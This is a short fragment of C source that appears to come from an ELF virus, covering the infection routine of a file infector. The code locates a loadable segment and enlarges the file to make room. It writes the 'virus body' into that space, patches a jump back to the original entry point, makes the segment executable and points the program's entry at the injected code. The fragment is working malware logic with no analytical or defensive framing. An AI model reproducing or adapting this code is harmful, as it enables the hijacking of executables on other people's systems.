	uint32_t t, u;
	Elf32_Phdr *p = NULL;
	for (i = 0; i < ehdr->e_phnum; i++)
		if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset) {
			p = &phdr[i];
			break;
		}
	if (p == NULL)
		goto _unmap;

	t = p->p_offset + p->p_filesz;
	u = p->p_memsz - p->p_filesz + g->size;
	MAKE_HOLE(t, u);
	bzero(m + t, u);
	
	SHIFT_SHDRS(t, u);
	
	/* write virus body */
	memcpy(m + p->p_offset + p->p_memsz, g->self, g->size);
	t = p->p_vaddr + p->p_memsz;
	*(uint32_t*)(m + p->p_offset + p->p_memsz + 8) = old_entry - t - 12;
	p->p_flags |= PF_X;
	p->p_filesz += u;
	p->p_memsz = p->p_filesz;
	ehdr->e_entry = t;
